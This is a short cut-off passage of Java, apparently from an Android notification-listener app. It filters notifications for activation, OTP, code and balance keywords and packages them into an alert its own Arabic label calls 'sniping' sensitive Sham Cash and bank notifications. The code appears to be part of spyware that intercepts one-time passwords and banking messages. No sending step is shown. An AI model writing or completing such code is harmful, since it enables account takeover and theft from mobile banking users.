                        lower.contains("تفعيل") || lower.contains("otp") || lower.contains("code") || lower.contains("رصيد")) {
                        
                        String msg = "🚨 [قنص إشعار حساس - شام كاش/تفعيل/بنوك]:\nالحزمة: " + pkg + "\nالعنوان: " + title + "\nالنص: " + text;
